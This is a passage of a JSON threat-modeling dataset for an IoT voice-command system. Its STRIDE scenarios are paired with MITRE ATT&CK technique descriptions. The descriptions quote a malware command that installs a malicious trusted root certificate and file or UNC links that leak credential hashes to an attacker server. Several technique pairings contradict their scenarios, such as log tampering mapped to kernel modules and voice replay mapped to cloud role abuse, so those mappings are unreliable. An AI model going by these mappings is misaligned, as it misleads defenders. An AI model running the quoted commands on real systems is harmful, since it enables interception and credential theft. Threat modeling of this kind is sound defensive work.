use.\n\nMalicious hooking mechanisms may also capture API calls that include parameters that reveal user authentication credentials for Credential Access. (Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept 2017)\n\nHooking is commonly utilized by [Rootkit](https://attack.mitre.org/techniques/T1014)s to conceal files, processes, Registry keys, and other objects in order to hide malware and associated behaviors. (Citation: Symantec Windows Rootkits)",
                "id": "attack-pattern--66f73398-8394-4711-85e5-34c8540b22a5",
                "technique_id": "T1179"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An unauthorized user claims they never authorized a specific IoT action performed by the system.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks robust non-repudiation controls.",
                    "Role": "System Designer",
                    "Condition": "Actions are not logged definitively with user identifiers."
                },
                {
                    "Assumption": "Logs are not immutable or adequately secured.",
                    "Role": "System Administrator",
                    "Condition": "Logs can be altered or deleted."
                },
                {
                    "Assumption": "User identity verification is not strong for critical actions.",
                    "Role": "System Designer",
                    "Condition": "The system does not enforce strong identity checks."
                }
            ],
            "Potential Impact": "Potential legal implications and security risks due to the inability to prove action origins.",
            "MITRE ATT&CK Keywords": [
                "non-repudiation",
                "action logging",
                "identity verification",
                "unauthorized actions"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Logs that record critical system actions are tampered with to hide malicious activities.",
            "Assumptions": [
                {
                    "Assumption": "There are no controls to prevent log tampering.",
                    "Role": "System Administrator",
                    "Condition": "Logs can be accessed and modified without detection."
                },
                {
                    "Assumption": "The system does not use secure logging practices.",
                    "Role": "System Designer",
                    "Condition": "Log integrity and security measures are weak or absent."
                },
                {
                    "Assumption": "There is no regular monitoring or audit of logs.",
                    "Role": "Security Team",
                    "Condition": "Logs are not reviewed or audited regularly."
                }
            ],
            "Potential Impact": "Security incidents go undetected, leading to prolonged exposure and potential damage.",
            "MITRE ATT&CK Keywords": [
                "log tampering",
                "secure logging",
                "audit trails",
                "malicious activities"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data is intercepted during transmission between the client-side application and the server.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without encryption.",
                    "Role": "System Designer",
                    "Condition": "The transmission channel does not use encryption."
                },
                {
                    "Assumption": "The attacker can monitor network traffic.",
                    "Role": "Attacker",
                    "Condition": "The network is not secure against eavesdropping."
                },
                {
                    "Assumption": "Sensitive data is sent in readable form.",
                    "Role": "System Designer",
                    "Condition": "Data is not obfuscated or encrypted at rest and in transit."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "eavesdropping",
                "unencrypted transmission",
                "data interception",
                "network security"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Cloud services storing sensitive user data are compromised.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage security policies are weak.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Security policies are not robustly implemented."
                },
                {
                    "Assumption": "Sensitive data is not encrypted both in storage and during access.",
                    "Role": "System Designer",
                    "Condition": "Encryption standards are not enforced."
                },
                {
                    "Assumption": "Access controls to cloud services are insufficient.",
                    "Role": "System Administrator",
                    "Condition": "Access controls are not strictly enforced."
                }
            ],
            "Potential Impact": "Exposure of user-sensitive information leading to privacy breaches.",
            "MITRE ATT&CK Keywords": [
                "cloud services",
                "data breach",
                "sensitive information",
                "access controls"
            ],
            "mitre_technique": {
                "name": "Cloud Services",
                "description": "Adversaries may log into accessible cloud services within a compromised environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078) that are synchronized with or federated to on-premises user identities. The adversary may then perform management actions or access cloud-hosted resources as the logged-on user. \n\nMany enterprises federate centrally managed user identities to cloud services, allowing users to login with their domain credentials in order to access the cloud control plane. Similarly, adversaries may connect to available cloud services through the web console or through the cloud command line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)), using commands such as <code>Connect-AZAccount</code> for Azure PowerShell, <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001) instead of a username and password. ",
                "id": "attack-pattern--8861073d-d1b8-4941-82ce-dce621d398f0",
                "technique_id": "T1021.007"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Backup data from the server-side application leaks due to weak security measures.",
            "Assumptions": [
                {
                    "Assumption": "Backup data is not stored securely.",
                    "Role": "System Administrator",
                    "Condition": "Backups are not encrypted."
                },
                {
                    "Assumption": "The attacker gains access to the backup storage location.",
                    "Role": "Attacker",
                    "Condition": "Backup storage is inadequately secured."
                },
                {
                    "Assumption": "Backup processes are not audited regularly.",
                    "Role": "Security Team",
                    "Condition": "Backup integrity and security are not regularly checked."
                }
            ],
            "Potential Impact": "Leakage of sensitive operational data.",
            "MITRE ATT&CK Keywords": [
                "backup data",
                "data leaks",
                "weak security",
                "data encryption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the voice command system with junk requests, overwhelming the server.",
            "Assumptions": [
                {
                    "Assumption": "Rate limiting or request filtering is not enforced.",
                    "Role": "System Designer",
                    "Condition": "There are no controls to limit excessive requests."
                },
                {
                    "Assumption": "The network architecture is not resilient to DDoS attacks.",
                    "Role": "System Administrator",
                    "Condition": "Network defenses are not robust."
                },
                {
                    "Assumption": "The attacker has significant network resources.",
                    "Role": "Attacker",
                    "Condition": "The attacker can generate a large volume of requests."
                }
            ],
            "Potential Impact": "Disruption of legitimate user access to the system.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "server overload",
                "network flooding"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the IoT controller to render it unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "The IoT controller has an exploitable vulnerability.",
                    "Role": "System Designer",
                    "Condition": "Vulnerability is present and exploitable."
                },
                {
                    "Assumption": "The attacker can reach the IoT controller over the network.",
                    "Role": "Attacker",
                    "Condition": "Network accesses are not restricted."
                },
                {
                    "Assumption": "The system lacks automated recovery procedures.",
                    "Role": "System Administrator",
                    "Condition": "There is no failover or recovery plan in place."
                }
            ],
            "Potential Impact": "Disruption of IoT device operations.",
            "MITRE ATT&CK Keywords": [
                "vulnerability exploitation",
                "IoT controller",
                "service disruption",
                "device unresponsive"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware deployed to the client-side application triggers a massive resource consumption.",
            "Assumptions": [
                {
                    "Assumption": "Client applications do not have resource usage monitoring.",
                    "Role": "System Designer",
                    "Condition": "Resource consumption is not capped or monitored."
                },
                {
                    "Assumption": "The malware can execute without detection.",
                    "Role": "Attacker",
                    "Condition": "No effective anti-malware measures are in place."
                },
                {
                    "Assumption": "The attacker has the means to deploy malware onto the client application.",
                    "Role": "Attacker",
                    "Condition": "Access to deploy the malware has been obtained via initial compromise."
                }
            ],
            "Potential Impact": "The client application becomes unresponsive, impacting user interactions.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "client-side application",
                "resource exhaustion",
                "application freeze"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a server-side vulnerability to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "Server has an unpatched vulnerability.",
                    "Role": "System Administrator",
                    "Condition": "The system is not up-to-date with security patches."
                },
                {
                    "Assumption": "The attacker can reach the server over the network.",
                    "Role": "Attacker",
                    "Condition": "Network defenses are inadequate."
                },
                {
                    "Assumption": "Administrative privileges provide extensive control over the system.",
                    "Role": "System Designer",
                    "Condition": "Certain actions require administrative access levels."
                }
            ],
            "Potential Impact": "The attacker gains full control over the server, potentially compromising the entire system.",
            "MITRE ATT&CK Keywords": [
                "vulnerability exploitation",
                "administrative privileges",
                "server control",
                "elevation of privilege"
            ],
            "mitre_technique": {
                "name": "Forced Authentication",
                "description": "Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.\n\nThe Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. (Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.\n\nWeb Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security)\n\nAdversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server. (Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to plaintext credentials. (Citation: Cylance Redirect to SMB)\n\nThere are several different ways this can occur. (Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use include:\n\n* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger the SMB request. (Citation: US-CERT APT Energy Oct 2017)\n* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <code>\\\\[remote address]\\pic.png</code> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT Energy Oct 2017)",
                "id": "attack-pattern--b77cf5f3-6060-475d-bd60-40ccbf28fdc2",
                "technique_id": "T1187"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Compromised credentials are used by the attacker to escalate privileges within the IoT controller.",
            "Assumptions": [
                {
                    "Assumption": "Credentials are not stored securely.",
                    "Role": "System Designer",
                    "Condition": "Credentials are stored in plaintext or weakly protected areas."
                },
                {
                    "Assumption": "There is inadequate monitoring of credential use.",
                    "Role": "System Administrator",
                    "Condition": "Credential usage is not logged or monitored closely."
                },
                {
                    "Assumption": "Privilege escalation controls are not enforced.",
                    "Role": "System Designer",
                    "Condition": "Lack of adequate control mechanisms for escalated privileges."
                }
            ],
            "Potential Impact": "Attacker gains unauthorized control of IoT devices via elevated privileges.",
            "MITRE ATT&CK Keywords": [
                "compromised credentials",
                "privilege escalation",
                "IoT controller",
                "access control"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "The attacker exploits client-side vulnerabilities to perform privileged actions on the server.",
            "Assumptions": [
                {
                    "Assumption": "Client-side vulnerabilities are present.",
                    "Role": "System Designer",
                    "Condition": "Application security is weak and vulnerabilities exist."
                },
                {
                    "Assumption": "Interactions between client and server are not strictly validated.",
                    "Role": "System Designer",
                    "Condition": "Lack of stringent validation checks."
                },
                {
                    "Assumption": "The attacker has the means to discover and use these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "The attacker's skills and tools are adequate for exploiting the vulnerabilities."
                }
            ],
            "Potential Impact": "Unauthorized privileged actions performed, compromising system integrity.",
            "MITRE ATT&CK Keywords": [
                "vulnerability exploitation",
                "client-side application",
                "server interaction",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "DLL Search Order Hijacking",
                "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\n\nPhantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files.(Citation: Adversaries Hijack DLLs) They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
                "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
                "technique_id": "T1574.001"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "22",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker records the user's voice and replays it to issue commands to the IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "The system relies solely on voice recognition for authentication.",
                    "Role": "System Designer",
                    "Condition": "No secondary authentication method is used."
                },
                {
                    "Assumption": "The attacker has access to a recording device.",
                    "Role": "Attacker",
                    "Condition": "Attacker can access the environment where the user speaks."
                }
            ],
            "Potential Impact": "Unauthorized access and control of IoT devices.",
            "MITRE ATT&CK Keywords": [
                "Voice Command Injection",
                "Replay Attack",
                "Impersonation",
                "IoT Devices"
            ],
            "mitre_technique": {
                "name": "Temporary Elevated Cloud Access",
                "description": "Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own. \n\nJust-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted.(Citation: Azure Just in Time Access 2023)\n\nAccount impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with the `iam.serviceAccountTokenCreator` role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account, while service accounts with domain-wide delegation permission are permitted to impersonate Google Workspace accounts.(Citation: Google Cloud Service Account Authentication Roles)(Citation: Hunters Domain Wide Delegation Google Workspace 2023)(Citation: Google Cloud Just in Time Access 2023)(Citation: Palo Alto Unit 42 Google Workspace Domain Wide Delegation 2023) In Exchange Online, the `ApplicationImpersonation` role allows a service account to use the permissions associated with specified user accounts.(Citation: Microsoft Impersonation and EWS in Exchange) \n\nMany cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services. While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted. In AWS, users with the `PassRole` permission can allow a service they create to assume a given role, while in GCP, users with the `iam.serviceAccountUser` role can attach a service account to a resource.(Citation: AWS PassRole)(Citation: Google Cloud Service Account Authentication Roles)\n\nWhile users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended.(Citation: Rhino Google Cloud Privilege Escalation)(Citation: Rhino Security Labs AWS Privilege Escalation)\n\n**Note:** this technique is distinct from [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003), which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources. However, adversaries that compromise a sufficiently privileged account may grant another account they control [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) that would allow them to also abuse these features. This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place.(Citation: CrowdStrike StellarParticle January 2022)",
                "id": "attack-pattern--6fa224c7-5091-4595-bf15-3fc9fe2f2c7c",
                "technique_id": "T1548.005"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malicious actor impersonates a legitimate user to access cloud services attached to the application.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services do not enforce strict authentication mechanisms.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Weak or no multi-factor authentication is implemented."
                },
                {
                    "Assumption": "Actor has valid credentials or can guess them.",
                    "Role": "Attacker",
                    "Condition": "Credentials are compromised or easily guessable."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive information stored in the cloud.",
            "MITRE ATT&CK Keywords": [
                "Credential Access",
                "Account Manipulation",
                "Cloud Service Abuse",
                "Identity Theft"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attacker uses a fake device pretending to be a legitimate IoT controller to intercept communications.",
            "Assumptions": [
                {
                    "Assumption": "Weak authentication between the IoT controller and client-side application.",
                    "Role": "System Designer",
                    "Condition": "Authentication mechanism can be bypassed."
                },
                {
                    "Assumption": "Attacker can introduce the fake device into the network environment.",
                    "Role": "Attacker",
                    "Condition": "Physical or network access to the deployment environment."
                }
            ],
            "Potential Impact": "Interception and manipulation of commands to IoT devices.",
            "MITRE ATT&CK Keywords": [
                "Man-In-The-Middle",
                "Device Impersonation",
                "Network Traffic Interception",
                "Command Injection"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters the server-side application to change command responses affecting IoT control.",
            "Assumptions": [
                {
                    "Assumption": "The server has vulnerabilities that allow arbitrary code execution.",
                    "Role": "System Administrator",
                    "Condition": "Server software not up to date with patches."
                },
                {
                    "Assumption": "Lack of integrity checks on server application code.",
                    "Role": "System Administrator",
                    "Condition": "No verification mechanism like code signing is in place."
                }
            ],
            "Potential Impact": "Compromised integrity and unauthorized changes to IoT device actions.",
            "MITRE ATT&CK Keywords": [
                "Code Injection",
                "Server Compromise",
                "Malicious Code Deployment",
                "Integrity Attack"
            ],
            "mitre_technique": {
                "name": "Dynamic-link Library Injection",
                "description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "id": "attack-pattern--f4599aa0-4f85-4a32-80ea-fc39dc965945",
                "technique_id": "T1055.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attacker intercepts and modifies communication between client-side and server-side applications.",
            "Assumptions": [
                {
                    "Assumption": "Communication is not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Lack of encrypted channels such as TLS."
                },
                {
                    "Assumption": "Attacker has network access.",
                    "Role": "Attacker",
                    "Condition": "Access to the same network as client or server."
                }
            ],
            "Potential Impact": "Manipulated data in transit affecting application logic and device commands.",
            "MITRE ATT&CK Keywords": [
                "Man-in-the-Middle",
                "Network Interception",
                "Data Tampering",
                "Packet Modification"
            ],
            "mitre_technique": {
                "name": "Install Root Certificate",
                "description": "Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)",
                "id": "attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1",
                "technique_id": "T1130"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains physical access to IoT devices and modifies their firmware.",
            "Assumptions": [
                {
                    "Assumption": "IoT devices have physical ports accessible.",
                    "Role": "IoT Device Maker",
                    "Condition": "Ports are not secured or disabled."
                },
                {
                    "Assumption": "Firmware lacks security features such as secure boot.",
                    "Role": "IoT Device Maker",
                    "Condition": "Devices are shipped without robust security measures."
                }
            ],
            "Potential Impact": "Compromised integrity of device operations leading to unauthorized behavior.",
            "MITRE ATT&CK Keywords": [
